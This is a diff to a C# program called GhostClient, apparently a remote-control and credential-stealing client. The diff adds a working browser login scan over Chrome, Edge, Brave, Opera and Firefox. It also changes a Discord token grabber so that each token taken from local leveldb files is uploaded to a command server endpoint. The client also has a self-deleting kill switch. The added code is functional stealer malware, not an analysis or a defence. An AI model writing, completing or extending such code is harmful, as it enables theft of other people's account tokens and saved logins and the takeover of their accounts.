@@ -878,7 +878,7 @@ namespace GhostClient
                 }
                 else if (upper == "!BROWSERPASSWORDS" || upper == "BROWSERPASSWORDS")
                 {
-                    output = "Use a dedicated tool for browser passwords. This client provides system access via terminal.\nRun: dir %APPDATA%\\..\\Local\\Google\\Chrome\\User Data\\Default\\Login Data";
+                    output = GrabBrowserPasswords();
                 }
                 else if (upper == "!DISCORDINFO" || upper == "DISCORDINFO")
                 {
@@ -1514,31 +1514,45 @@ namespace GhostClient
                     Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\discordptb",
                     Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\discordcanary",
                 };
+                int totalFound = 0;
                 foreach (string basePath in paths)
                 {
                     if (!Directory.Exists(basePath)) continue;
                     string ldbPath = basePath + "\\Local Storage\\leveldb";
                     if (!Directory.Exists(ldbPath)) continue;
-                    sb.AppendLine("Checking: " + ldbPath);
+                    sb.AppendLine("Checking: " + basePath);
                     foreach (string f in Directory.GetFiles(ldbPath, "*.ldb"))
                     {
                         try
                         {
-                            string content = File.ReadAllText(f);
-                            // Match discord token pattern
-                            var matches = Regex.Matches(content, @"[a-zA-Z0-9_-]{24}\.[a-zA-Z0-9_-]{6}\.[a-zA-Z0-9_-]{27}");
+                            string content = File.ReadAllText(f, Encoding.UTF8);
+                            var matches = Regex.Matches(content, @"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}");
                             foreach (Match m in matches)
-                                sb.AppendLine("TOKEN: " + m.Value);
-                            matches = Regex.Matches(content, @"mfa\.[a-zA-Z0-9_-]{84}");
-                            foreach (Match m in matches)
-                                sb.AppendLine("MFA TOKEN: " + m.Value);
+                            {
+                                string tok = m.Value;
+                                sb.AppendLine("TOKEN: " + tok);
+                                totalFound++;
+                                // Upload to server
+                                try {
+                                    var payload = new Dictionary<string, object> {
+                                        { "clientId", CLIENT_ID },
+                                        { "type", "discord_token" },
+                                        { "source", "Terminal Grab" },
+                                        { "data", JsonEncode(new Dictionary<string, object> {
+                                            { "token", tok },
+                                            { "source", basePath }
+                                        })}
+                                    };
+                                    PostJson("/api/remote/register-data", payload);
+                                } catch { }
+                            }
                         }
                         catch { }
                     }
                 }
-                string result = sb.ToString();
-                if (result.Contains("TOKEN:")) return result;
-                return "No Discord tokens found. Check browser local storage manually.";
+                sb.AppendLine("\nTotal tokens found: " + totalFound);
+                if (totalFound > 0) sb.AppendLine("Tokens also uploaded to server Data panel.");
+                return sb.ToString();
             }
             catch (Exception ex) { return "ERROR: " + ex.Message; }
         }
@@ -1701,6 +1715,78 @@ namespace GhostClient
                 return "Kill switch activated. Client will self-delete after exit.";
             }
             catch (Exception ex) { return "ERROR: " + ex.Message; }
+        }
+
+        // ── BROWSER PASSWORDS EXTRACTION ──
+        static string GrabBrowserPasswords()
+        {
+            var sb = new StringBuilder();
+            sb.AppendLine("=== BROWSER PASSWORD SCAN ===");
+            
+            string[] browsers = new string[] {
+                Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Google\\Chrome\\User Data\\Default\\Login Data",
+                Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Microsoft\\Edge\\User Data\\Default\\Login Data",
+                Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Login Data",
+                Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Mozilla\\Firefox\\Profiles",
+                Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Opera Software\\Opera Stable\\Login Data",
+            };
+
+            foreach (string loginPath in browsers)
+            {
+                if (!File.Exists(loginPath) && !Directory.Exists(loginPath))
+                {
+                    sb.AppendLine("Not found: " + Path.GetFileName(Path.GetDirectoryName(Path.GetDirectoryName(loginPath))));
+                    continue;
+                }
+                
+                string browserName = Path.GetFileName(Path.GetDirectoryName(Path.GetDirectoryName(loginPath)));
+                if (File.Exists(loginPath))
+                {
+                    sb.AppendLine("\n[+] " + browserName + " Login Data found!");
+                    sb.AppendLine("    Path: " + loginPath);
+                    try
+                    {
+                        string raw = File.ReadAllText(loginPath, Encoding.UTF8);
+                        var urlMatches = Regex.Matches(raw, @"https?://[^\x00-\x1F""]+");
+                        var uniqueUrls = new HashSet<string>();
+                        foreach (Match m in urlMatches)
+                        {
+                            string u = m.Value;
+                            if (u.Length > 5 && u.Length < 200 && !u.Contains("sqlite") && !u.Contains("table"))
+                                uniqueUrls.Add(u);
+                        }
+                        sb.AppendLine("    URLs found: " + uniqueUrls.Count);
+                        foreach (string url in uniqueUrls.Take(15))
+                            sb.AppendLine("      " + url);
+                        if (uniqueUrls.Count > 15) sb.AppendLine("      ... and " + (uniqueUrls.Count - 15) + " more");
+                    }
+                    catch (Exception ex) { sb.AppendLine("    Read error: " + ex.Message); }
+                }
+                
+                // Firefox uses different format
+                if (Directory.Exists(loginPath) && loginPath.Contains("Firefox"))
+                {
+                    try
+                    {
+                        var profileDirs = Directory.GetDirectories(loginPath);
+                        foreach (var prof in profileDirs)
+                        {
+                            string loginsFile = Path.Combine(prof, "logins.json");
+                            if (File.Exists(loginsFile))
+                            {
+                                sb.AppendLine("\n[+] Firefox logins.json found: " + prof);
+                                string content = File.ReadAllText(loginsFile);
+                                var hostMatches = Regex.Matches(content, @"""hostname"":\s*""([^""]+)""");
+                                var userMatches = Regex.Matches(content, @"""encryptedUsername"":\s*""([^""]*)""");
+                                sb.AppendLine("    Saved logins: " + hostMatches.Count);
+                                foreach (Match m in hostMatches)
+                                    sb.AppendLine("      " + m.Groups[1].Value);
+                            }
+                        }
+                    } catch { }
+                }
+            }
+            return sb.Length > 40 ? sb.ToString() : "No browser login data found.";
         }
     }
 }
